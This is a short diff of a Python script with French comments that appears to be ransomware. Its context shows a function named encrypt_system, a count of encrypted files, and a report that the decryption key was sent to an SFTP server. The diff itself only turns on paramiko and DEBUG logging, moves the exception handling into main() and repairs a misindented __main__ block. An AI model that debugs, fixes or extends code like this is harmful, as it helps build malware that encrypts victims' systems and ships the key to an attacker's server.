@@ -169,10 +169,13 @@ def encrypt_system(fernet):
 
 
 def main():
+    # Activation du debug paramiko
+    paramiko.util.log_to_file('/tmp/paramiko_debug.log')
+
     # Configuration logging
     logging.basicConfig(
         filename=LOG_FILE,
-        level=logging.INFO,
+        level=logging.DEBUG,  # Changé en DEBUG pour plus d'informations
         format='%(asctime)s - %(levelname)s - %(message)s'
     )
 
@@ -207,19 +210,15 @@ Clé de déchiffrement envoyée à: {SFTP_SERVER}
 Fichiers chiffrés: {count}
 """)
 
+    except Exception as e:
+        logging.error(f"ERREUR FATALE: {str(e)}", exc_info=True)
+        raise
     finally:
         if os.path.exists(SAFETY_LOCK):
             os.remove(SAFETY_LOCK)
 
     logging.critical("=== CHIFFREMENT TERMINÉ ===")
 
-    if __name__ == "__main__":
-    # Activation du debug paramiko
-        paramiko.util.log_to_file('/tmp/paramiko_debug.log')
 
-    # Exécution
-    try:
-        main()
-    except Exception as e:
-        logging.error(f"ERREUR FATALE: {str(e)}", exc_info=True)
-        raise
+if __name__ == "__main__":
+    main()
